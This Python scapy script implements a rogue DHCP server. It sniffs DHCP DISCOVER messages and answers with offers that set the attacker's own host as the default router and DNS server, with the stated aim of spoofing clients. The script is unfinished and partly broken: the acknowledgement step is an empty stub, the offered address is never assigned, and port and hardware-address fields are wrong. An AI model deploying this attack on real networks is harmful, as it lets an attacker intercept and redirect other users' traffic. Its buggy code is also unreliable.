from scapy.all import sniff,UDP,DHCP,BOOTP,IP,Ether \
    ,RandInt,RandMAC,srp1,sendp,DHCPRevOptions, \
    get_if_addr, get_if_hwaddr, conf
'''
I sniff for discover, than send offer, tan ack?h
'''
'''class DHCPStatus(Enum):
    DISCOVER=0
    REQUEST=1
    MANTAIN0 = 2
    MANTAIN50=3
    MANTAIN87=4
    RECYCLE = 5'''

class Client:
    info = {
        "clientNewIp" : None,
        "clientMac" : None
    }
    def __init__(self, mac) -> None:
        #self.info["clientIp"] = ip
        self.info["clientMac"] = mac

class DHCP_Fake_Server:
    client = None
    info = {
        "myMac" : None,
        "myIp" : None,

        "dstPort" : 67,
        "srcPort" : 68,
        "fakeRouterAddress" : None,
        "subnetMask" : None,
        "broadcastIp" : "255.255.255.255",
        "broadcastMac" : "ff:ff:ff:ff:ff:ff",
        "interface" : conf.iface
    }
    def __init__(self):
        self.info["myMac"] = get_if_hwaddr(conf.iface)
        self.info["myIp"] = get_if_addr(conf.iface)
        self.info["fakeRouterAddress"] = self.info["myIp"]
        self.info["subnetMask"] = next(filter(lambda x : x[3] == conf.iface  , dict(conf.route.__dict__)["routes"]))[1]

    def sendOffer(self):
        Frame = Ether(src = self.info["myMac"] , dst = self.client.info["clientMac"] ) 
        Datagram = IP(src = self.info["myIp"] , dst = self.info["broadcastIp"] )
        Segment=UDP(dport=self.info["dstPort"], sport=self.info["srcPort"])
        Bootp= BOOTP(op=2, yiaddr=self.client.info["clientNewIp"], siaddr=self.info["myIp"], chaddr= self.info["myMac"])
        Dhcp = DHCP(options=[("message-type", "offer"),
         ("server_id", self.info["myIp"]),
         ("router", self.info["fakeRouterAddress"]),
         ("subnet_mask", "255.255.255.0"),
         ("name_server", self.info["myIp"])]) # "Broadcast_address" destroyed everything
        pack = Frame/Datagram/Segment/Bootp/Dhcp
        pack.show()
        return srp1(pack,iface=self.info["interface"])


    def listenForDiscover(self):
        print("started listen for DISCOVER messages")
        sniff(lfilter= lambda packet : DHCP in packet and ('message-type', 1) in packet[DHCP].options, #is an DISCOVER message
                prn = lambda packet : self.handleDiscover(packet))

    def handleDiscover(self, packet):
        print("----New Client ask for an IP address")
        packet.show()
        print("OFFER message: ")
        self.client = Client(packet[Ether].src)
        request = self.sendOffer()
        print("----Offer have been sented")
        #print(request[DHCP].options)
        self.sendAck()
        print("----Client spoofed!!!")

    def sendAck(self):
        ...

fakeDhcp = DHCP_Fake_Server()
fakeDhcp.listenForDiscover()